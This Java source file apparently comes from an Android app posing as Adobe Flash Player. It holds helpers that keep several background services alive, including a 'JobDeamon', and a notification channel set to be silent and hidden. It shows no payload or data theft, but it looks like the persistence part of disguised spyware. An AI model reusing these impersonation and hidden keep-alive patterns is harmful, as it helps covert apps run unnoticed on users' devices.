package com.adobe.flashplayer.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.install.InstallActivity;

public class CoreHelper {

    private static final String TAG 			= "[ljg]CoreHelper ";

    public static void startForegroundService_inner(Context context){
        if(Utils.isServiceRunning(context, ForegroundSrv.class.getName()) == false){
            Intent intentservice = new Intent(context,ForegroundSrv.class);
            intentservice.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentservice);
            Log.e(TAG, "ForegroundService started");
            MyLog.writeLogFile(TAG+"ForegroundService started\r\n");
        }
    }

    public static void startRemoteService_inner(Context context){
        if(Utils.isServiceRunning(context, RemoteSrv.class.getName()) == false){
            Intent intentfore = new Intent(context, ForegroundSrv.class);
            intentfore.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentfore);

            Log.e(TAG, "startRemoteService started");
            MyLog.writeLogFile(TAG+"startRemoteService started\r\n");
        }
    }

    public static void startJobDeamonService_inner(Context context){
        if(Utils.isServiceRunning(context, JobDeamonSrv.class.getName()) == false){
            Intent intentDeamon = new Intent(context, JobDeamonSrv.class);
            intentDeamon.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startService(intentDeamon);
            Log.e(TAG, "startJobDeamonService started");
            MyLog.writeLogFile(TAG+"startJobDeamonService started\r\n");
        }
    }





    public static void startForegroundService(Context context){
        if(Utils.isServiceRunning(context, ForegroundSrv.class.getName()) == false){
            ComponentName componentName = new ComponentName(context, ForegroundSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);

            Log.e(TAG, "startForegroundService started");
            MyLog.writeLogFile(TAG+"startForegroundService started\r\n");
        }
    }


    public static void startRemoteService(Context context){
        if(Utils.isServiceRunning(context, RemoteSrv.class.getName()) == false){

            ComponentName componentName = new ComponentName(context, RemoteSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);

            Log.e(TAG, "startRemoteService started");
            MyLog.writeLogFile(TAG+"startRemoteService started\r\n");
        }
    }

    public static void startJobDeamonService(Context context){
        if(Utils.isServiceRunning(context, JobDeamonSrv.class.getName()) == false){
            ComponentName componentName = new ComponentName(context, JobDeamonSrv.class);

            Intent intent =new Intent();

            intent.setComponent(componentName );

            context.startService(intent);
            Log.e(TAG, "startJobDeamonService started");
            MyLog.writeLogFile(TAG+"startJobDeamonService started\r\n");
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String createNotificationChannel(String channelId, String channelName, Context context){
        NotificationChannel chan = new NotificationChannel(channelId,
                channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager service = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        service.createNotificationChannel(chan);
        return channelId;
    }


    public static native int fileLock(String dstfn);
}


